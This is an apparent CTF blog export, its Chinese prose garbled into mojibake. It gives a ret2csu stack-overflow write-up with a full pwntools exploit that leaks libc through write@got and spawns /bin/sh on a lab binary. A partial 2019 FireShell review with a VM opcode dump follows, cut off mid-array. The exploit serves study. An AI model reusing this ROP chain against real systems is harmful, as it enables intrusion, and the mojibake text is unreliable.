ˆä¸Šã€‚åŒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨çš„å†…å­˜åœ°å€ä¸èƒ½å¤§äº0x00007fffffffffffï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚æ‰€ä»¥64ä½çš„ç¨‹åºéœ€è¦é€šè¿‡ropæˆ–è€…libcä¸­çš„å‡½æ•°æ¥è®¾ç½®å‚æ•°ã€‚ åˆ†æç¨‹åºç¨‹åºç»™å‡ºçš„æºç å¦‚ä¸‹ï¼š 1234567891011121314#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, \"Hello, World\\n\", 13); vulnerable_function();&#125; åªå¼€äº†NXï¼Œé‚£ä¹ˆvulnerable_function()ä¸­çš„æ ˆæº¢å‡ºæ˜¯å¾ˆæ˜¾ç„¶çš„ï¼š 123456[*] '/home/assassinq/pwn/ROP_STEP_BY_STEP/linux_x64/level5_ori/level5' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) æ²¡æœ‰ä»»ä½•å¯è¾…åŠ©çš„å‡½æ•°ï¼ŒåŒæ—¶ä¹Ÿæ‰¾ä¸åˆ°å¯ç”¨çš„gadgetsæ¥ç”¨ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°libcä¸­çš„ä¸€ä¸ªå‡½æ•°__libc_csu_init()ï¼š 1234567891011121314151617181920212223242526272829303132333435363738.text:00000000004005A0 mov [rsp+var_28], rbp.text:00000000004005A5 mov [rsp+var_20], r12.text:00000000004005AA lea rbp, cs:600E24h.text:00000000004005B1 lea r12, cs:600E24h.text:00000000004005B8 mov [rsp+var_18], r13.text:00000000004005BD mov [rsp+var_10], r14.text:00000000004005C2 mov [rsp+var_8], r15.text:00000000004005C7 mov [rsp+var_30], rbx.text:00000000004005CC sub rsp, 38h.text:00000000004005D0 sub rbp, r12.text:00000000004005D3 mov r13d, edi.text:00000000004005D6 mov r14, rsi.text:00000000004005D9 sar rbp, 3.text:00000000004005DD mov r15, rdx.text:00000000004005E0 call _init_proc.text:00000000004005E5 test rbp, rbp.text:00000000004005E8 jz short loc_400606.text:00000000004005EA xor ebx, ebx.text:00000000004005EC nop dword ptr [rax+00h].text:00000000004005F0.text:00000000004005F0 loc_4005F0: ; CODE XREF: __libc_csu_init+64â†“j.text:00000000004005F0 mov rdx, r15.text:00000000004005F3 mov rsi, r14.text:00000000004005F6 mov edi, r13d.text:00000000004005F9 call qword ptr [r12+rbx*8].text:00000000004005FD add rbx, 1.text:0000000000400601 cmp rbx, rbp.text:0000000000400604 jnz short loc_4005F0.text:0000000000400606.text:0000000000400606 loc_400606: ; CODE XREF: __libc_csu_init+48â†‘j.text:0000000000400606 mov rbx, [rsp+38h+var_30].text:000000000040060B mov rbp, [rsp+38h+var_28].text:0000000000400610 mov r12, [rsp+38h+var_20].text:0000000000400615 mov r13, [rsp+38h+var_18].text:000000000040061A mov r14, [rsp+38h+var_10].text:000000000040061F mov r15, [rsp+38h+var_8].text:0000000000400624 add rsp, 38h.text:0000000000400628 retn å¯ä»¥çœ‹åˆ°åœ¨loc_4005F0ä¹‹åï¼Œæœ‰å¯¹ç¬¬ä¸‰ä¸ªå‚æ•°rdxã€ç¬¬äºŒä¸ªå‚æ•°rsiä»¥åŠç¬¬ä¸€ä¸ªå‚æ•°rdiçš„movæ“ä½œã€‚åŒæ—¶å¦‚æœåˆç†è®¾ç½®r12å’Œrbxçš„å¤§å°ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåšåˆ°callæŸä¸ªå‡½æ•°ã€‚å°¾å·´ä¸Šè¿˜æœ‰movæ ˆä¸Šçš„å€¼åˆ°ä¸€äº›å¯„å­˜å™¨ä¸­ï¼Œä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°è¿™å’Œä¹‹å‰çš„å‚æ•°ä¹Ÿæœ‰ä¸€äº›è”ç³»ã€‚æ„é€ å‡ºä¸€ä¸ªcsu()çš„å‡½æ•°ã€‚å› ä¸ºåœ¨ç¬¬äºŒæ¬¡è·³è½¬ä¸Šå»åï¼Œè¿˜æœ‰ä¸€æ¬¡add rsp, 0x38ï¼Œæ‰€ä»¥éœ€è¦åœ¨æ ˆä¸Šå†è¡¥56ä¸ªbyteï¼š 1234567891011121314151617181920212223# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): # function = r12 # rdi = r13, rsi = r14, rdx = r15 payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1) ç¼–å†™expç„¶åæ¥ä¸‹æ¥çš„ä¸»è¦åˆ†ä¸ºä¸‰æ­¥ã€‚ç¬¬ä¸€æ­¥æ³„æ¼å‡ºwrite()å‡½æ•°çš„åœ°å€ï¼Œä»¥è·å–libcï¼š 123456789101112131415# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve)) è¿™é‡Œå¯¹libcçš„æ³„æ¼åŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡DynELFæ¥çˆ†ç ´ï¼š 123456789def leak(address): csu(0, 1, write_got, 1, address, 8, main_addr) data = p.recv(8) return data# leak libclog.info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')dynelf = DynELF(leak, elf=elf)system_addr = dynelf.lookup('system', 'libc') æ‹¿åˆ°libcåå¯ä»¥è·å¾—systemæˆ–è€…æ˜¯execveçš„åç§»ã€‚åŒæ—¶æˆ‘ä»¬å‘ç°bssæ®µå¯å†™ï¼Œæ•…æ¥ä¸‹æ¥åœ¨bssæ®µå†™å…¥systemçš„åœ°å€ï¼Œä»¥åŠå­—ç¬¦ä¸²/bin/shï¼š 12345678# read(STDIN_FILENO, bss, 16)# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1) æœ€åä¸€éƒ¨åªéœ€è¦æ‰§è¡Œcallå·²ç»å†™å…¥çš„systemå¹¶ä¸”å°†/bin/shä½œä¸ºå‚æ•°æ‰§è¡Œå³å¯ï¼š 12345# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main) æ•´ç†ä¸€ä¸‹ï¼Œæœ€åçš„expå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./level5')# p = remote('127.0.0.1',10001)elf = ELF('./level5')write_got = elf.got['write']read_got = elf.got['read']main = elf.symbols['main']bss = elf.bss()log.success('write_got = ' + hex(write_got))log.success('read_got = ' + hex(read_got))log.success('main = ' + hex(main))log.success('bss = ' + hex(bss))# gdb.attach(p)# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1)# rdi = edi = r13, rsi = r14, rdx = r15# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve))# read(STDIN_FILENO, bss, 16);# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1)# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main)log.info('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() åšé¢˜çš„æ—¶å€™é‡åˆ°çš„ä¸€ä¸ªå°bugæ˜¯å½“ä¼ çš„payloadä¸­çš„æ— æ„ä¹‰å­—ç¬¦å¦‚æœä¸ä¸º\\x00ï¼Œæœ€åè·‘systemä¼šåæ‰ï¼Œä½†æ˜¯execveä¸ä¼šå½±å“ã€‚å¦‚æœå°†bufå¡«å……ä¸º\\x00ï¼Œæ‰å¯ä»¥æ‰§è¡Œsystemã€‚å…·ä½“åŸå› è¿˜æ²¡æœ‰å¼„æ¸…æ¥šã€‚ ä»¥ä¸‹å†è¡¥å……ä¸€ç‚¹å…³äº__libc_csu_init()çš„ç‚¹ï¼Œä¹Ÿå°±æ˜¯éšè—gadgetsï¼š ä¹Ÿæ˜¯libcè®¾è®¡æ—¶çš„ä¸€ä¸ªbugï¼Œä¸åŒçš„åç§»ä¸‹ï¼Œè¿˜èƒ½å¤Ÿå¾—åˆ°pop rdi ; retå’Œpop rsi ; pop r15 ; retä¸¤ä¸ªgadgetsï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061assassinq&gt;&gt; x/5i 0x000000000040061A 0x40061a &lt;__libc_csu_init+90&gt;: pop rbx 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14assassinq&gt;&gt; x/5i 0x000000000040061B 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15assassinq&gt;&gt; x/5i 0x000000000040061C 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret assassinq&gt;&gt; x/5i 0x000000000040061D 0x40061d &lt;__libc_csu_init+93&gt;: pop rsp 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret assassinq&gt;&gt; x/5i 0x000000000040061E 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x000000000040061F 0x40061f &lt;__libc_csu_init+95&gt;: pop rbp 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400621 0x400621 &lt;__libc_csu_init+97&gt;: pop rsi 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400622 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz ret assassinq&gt;&gt; x/5i 0x0000000000400623 0x400623 &lt;__libc_csu_init+99&gt;: pop rdi 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz retassassinq&gt;&gt; quit å‚è€ƒç½‘ç«™https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csuhttps://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.htmlhttps://www.jianshu.com/p/73fff078c19chttps://www.jianshu.com/p/a32dc72bb20f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"2019-FireShell-review","slug":"ã€æœªå®Œæˆã€‘2019-FireShell-review","date":"2019-01-30T04:51:13.000Z","updated":"2019-02-01T12:08:18.439Z","comments":true,"path":"2019/01/30/ã€æœªå®Œæˆã€‘2019-FireShell-review/","link":"","permalink":"https://qianfei11.github.io/2019/01/30/ã€æœªå®Œæˆã€‘2019-FireShell-review/","excerpt":"æ¯”èµ›æ²¡æ‰“ï¼Œå½“ä½œç»ƒä¹ ä»¥åŠçœ‹ç€å¤§ä½¬çš„writeupå¤ç°äº†ä¸€ä¸‹å‡ é“äºŒè¿›åˆ¶ã€‚","text":"æ¯”èµ›æ²¡æ‰“ï¼Œå½“ä½œç»ƒä¹ ä»¥åŠçœ‹ç€å¤§ä½¬çš„writeupå¤ç°äº†ä¸€ä¸‹å‡ é“äºŒè¿›åˆ¶ã€‚ REBlackbox-0å…ˆfileä¸€ä¸‹ï¼š 12$ file Blackbox-0.exe Blackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows è¿è¡Œç¨‹åºï¼š 1234This binary is a black box.This means that it was designed to be analyzed without looking it&apos;s inside contentsYou will solve the chalenge by letting the flag to be outputted in some way.You will need to figure out what this binary is doing by just examining it&apos;s behaviour in the environment. æ˜¯.NETç¨‹åºï¼Œæ•…ä½¿ç”¨dnSpyæ¥è°ƒè¯•ã€‚åœ¨å•æ­¥æ—¶ï¼Œå‘ç°\\u000F\\u2009ç¬¬354è¡Œè¿”å›ä¸€ä¸ªå˜é‡textã€‚ åœ¨è¿™é‡Œè®¾ä¸‹æ–­ç‚¹ï¼Œå¹¶å¤šæ¬¡ç»§ç»­åä¼šå¾—åˆ°ä¸€ä¸²base64ï¼Œè§£å¯†å¾—åˆ°flagï¼š Blackbox-1fileä¸€ä¸‹ï¼š 12$ file Blackbox-1.exe Blackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows è¿è¡Œç¨‹åºæ²¡æœ‰ä»»ä½•è¾“å‡ºã€‚åŒæ ·å› ä¸ºæ˜¯.NETç¨‹åºï¼Œä½¿ç”¨dnSpyè°ƒè¯•ã€‚åœ¨\\u000F\\u2009ç¬¬358è¡Œè¿”å›ä¸€ä¸ªå˜é‡textï¼š åœ¨æ­¤å¤„è®¾ç½®æ–­ç‚¹å¹¶å¤šæ¬¡ç»§ç»­ï¼Œtextçš„å€¼ä¼šå˜æˆflagï¼š babyvmä¸€é“ç®€å•è™šæ‹Ÿæœºã€‚è¿è¡Œä¸€ä¸‹å‡ºç°Program executed successfully!ã€‚å…ˆæ‹–è¿›idaæŸ¥çœ‹mainå‡½æ•°ï¼š 12345678910__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; while ( (_BYTE)end_sign ) &#123; get_option(); vm_start(); ++j; &#125; return 0LL;&#125; ç¬¬ä¸€ä¸ªå‡½æ•°è·å–ä¸€ä¸ªoptionï¼Œç„¶åè¿›å…¥vm_start()æ‰§è¡ŒæŒ‡ä»¤ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int vm_start()&#123; void *__ptr32 *v0; // rax int v1; // eax int v2; // ST34_4 int v3; // eax int v4; // ST3C_4 int v5; // eax int v6; // ST28_4 int v7; // eax int v8; // ST30_4 int v9; // eax int v10; // ST1C_4 int v11; // eax int v12; // ST24_4 int v13; // eax int v14; // ST10_4 int v15; // eax int v16; // ST18_4 __int64 savedregs; // [rsp+40h] [rbp+0h] v0 = off_33D0; switch ( (unsigned int)&amp;savedregs ) &#123; case 0u: ++i; ++j; v0 = (void *__ptr32 *)buf; buf[i] = code[j]; break; case 1u: v1 = i--; v2 = buf[v1]; v3 = i--; v4 = buf[v3] + v2; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v4; break; case 3u: LOBYTE(end_sign) = 0; LODWORD(v0) = puts(\"Program executed successfully!\"); break; case 4u: v5 = i--; v6 = buf[v5]; v7 = i--; v8 = v6 * buf[v7]; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v8; break; case 5u: v9 = i--; v10 = buf[v9]; v11 = i--; v12 = buf[v11] / v10; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v12; break; case 6u: v13 = i--; v14 = buf[v13]; v15 = i--; v16 = buf[v15] - v14; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v16; break; default: return (signed int)v0; &#125; return (signed int)v0;&#125; å¯ä»¥å‘ç°ç¨‹åºæ‰§è¡Œäº†å†…éƒ¨çš„æŒ‡ä»¤ï¼Œæ²¡æœ‰ä»»ä½•ä¸æŒ‡ä»¤æœ‰å…³çš„è¾“å‡ºã€‚åªç®¡æŠŠæŒ‡ä»¤dumpå‡ºæ¥ï¼Œå†æŠŠswitchå†™å‡ºæ¥å¤ç°ä¸€ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940code = [0x00000000, 0x00000046, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000343, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000016D5, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000016D5, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000048, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000059, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000024, 0x00000001, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CD5B, 0x00000006, 0x00000002, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CDA1, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000043, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000000F5, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00000149, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000066D, 0x00000000, 0x0000003E, 0x00000001, 0x00000000, 0x000006AB, 0x00000000, 0x0000005A, 0x00000001, 0x00000000, 0x00000705, 0x00000000, 0x00000026, 0x00000006, 0x00000000, 0x00000705, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000E0A, 0x00000000, 0x00000009, 0x00000006, 0x00000000, 0x00000E0A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00008C64, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00034A58, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00170868, 0x00000000, 0x00000032, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000002, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000010, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00170845, 0x00000006, 0x00000002, 0x00000000, 0x00170868, 0x00000000, 0x00170868, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x0000003F, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000006, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000005C4, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x000005ED, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000004D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000000C, 0x00000001, 0x00000000, 0x000005F9, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002FC8, 0x00000000, 0x00000050, 0x00000001, 0x00000000, 0x00003018, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C060, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x0000C085, 0x00000000, 0x00000023, 0x00000006, 0x00000000, 0x0000C085, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0001810A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x000F0A64, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x001E14C8, 0x00000000, 0x0000001C, 0x00000001, 0x00000000, 0x001E14E4, 0x00000000, 0x001E1469, 0x00000006, 0x00000002, 0x00000000, 0x001E14E4, 0x00000000, 0x001E14E4, 0x00000006, 0x00000000, 0x00000043, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000014F, 0x00000000, 0x00000018, 0x00000006, 0x00000000, 0x0000014F, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000007DA, 0x00000000, 0x00000051, 0x00000001, 0x00000000, 0x0000082B, 0x00000000, 0x0000004F, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00004158, 0x00000000, 0x00000019, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00004159, 0x00000000, 0x0000004D, 0x00000001, 0x00000000, 0x000041A6, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000189E4, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC4F9, 0x00000006, 0x00000002, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC53C, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000249, 0x00000000, 0x00000047, 0x00000001, 0x00000000, 0x00000290, 0x00000000, 0x00000012, 0x00000001, 0x00000000, 0x000002A2, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x000002A2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000017B2, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x000017B2, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00001813, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00003026, 0x00000000, 0x0000000A, 0x00000006, 0x00000000, 0x00003026, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C098, 0x00000000, 0x00000045, 0x00000006, 0x00000000, 0x0000C098, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x0000C0EA, 0x00000000, 0x00000037, 0x00000001, 0x00000000, 0x0000C121, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00030484, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00121B18, 0x00000000, 0x00121AA3, 0x00000006, 0x00000002, 0x00000000, 0x00121B18, 0x00000000, 0x00121B18, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000011, 0x00000001, 0x00000000, 0x00000046, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000008C, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000003D4, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000016F8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x000016F8, 0x00000000, 0x00000003, 0x00000001, 0x00000000, 0x000016FB, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00002DF6, 0x00000000, 0x00000060, 0x00000001, 0x00000000, 0x00002E56, 0x00000000, 0x0000005F, 0x00000001, 0x00000000, 0x00002EB5, 0x00000000, 0x00000013, 0x00000001, 0x00000000, 0x00002EC8, 0x00000000, 0x0000002F, 0x00000001, 0x00000000, 0x00002EF7, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0001A6AF, 0x00000000, 0x00000018, 0x00000001, 0x00000000, 0x0001A6C7, 0x00000000, 0x00000039, 0x00000001, 0x00000000, 0x0001A700, 0x00000000, 0x00000043, 0x00000001, 0x00000000, 0x0001A743, 0x00000000, 0x0001A70E, 0x00000006, 0x00000002, 0x00000000, 0x0001A743, 0x00000000, 0x0001A743, 0x00000006, 0x00000000, 0x00000074, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00000099, 0x00000000, 0x00000053, 0x00000006, 0x00000000, 0x00000099, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000561, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x000005C4, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002E20, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00002E45, 0x00000000, 0x00000008, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000001, 